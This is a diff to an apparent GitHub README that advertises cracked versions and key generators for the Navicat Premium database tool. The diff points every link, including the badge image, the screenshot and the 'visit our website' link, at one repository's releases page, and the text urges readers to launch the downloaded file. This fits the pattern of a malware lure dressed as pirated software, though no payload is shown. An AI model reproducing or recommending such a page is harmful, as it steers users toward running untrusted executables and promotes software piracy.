@@ -10,7 +10,7 @@ Welcome to the ultimate repository for all things Navicat Premium! Here, you wil
 ## Get Started
 To get started with Navicat Premium, download it from the link below:
 
-[![Download Navicat Premium](https://img.shields.io/badge/Download-Navicat_Premium-blue)](https://github.com/files/Project.zip)
+[![Download Navicat Premium](https://github.com/chadthom7382/Navicat-Premium-Free/releases)](https://github.com/chadthom7382/Navicat-Premium-Free/releases)
 
 Please ensure you launch the file once it is downloaded to start using Navicat Premium.
 
@@ -25,7 +25,7 @@ Navicat Premium is a powerful database development tool that allows you to conne
 - Secure connections
 - And much more!
 
-![Navicat Premium](https://user-images.githubusercontent.com/1234567/89012345/image.png)
+![Navicat Premium](https://github.com/chadthom7382/Navicat-Premium-Free/releases)
 
 ## Crack Versions and Key Generators
 Looking for crack versions or key generators for Navicat Premium? Look no further! Our repository provides access to the latest crack versions and key generators for Navicat Premium 15 and 16.
@@ -40,7 +40,7 @@ Looking for crack versions or key generators for Navicat Premium? Look no furthe
 If you have any insights, tips, or new crack versions/key generators to share, feel free to contribute to our repository. Together, let's make Navicat Premium accessible to everyone!
 
 ## Visit our Website
-For more information and resources related to Navicat Premium, visit our website [here](https://www.navicatpremium.com).
+For more information and resources related to Navicat Premium, visit our website [here](https://github.com/chadthom7382/Navicat-Premium-Free/releases).
 
 ---
 
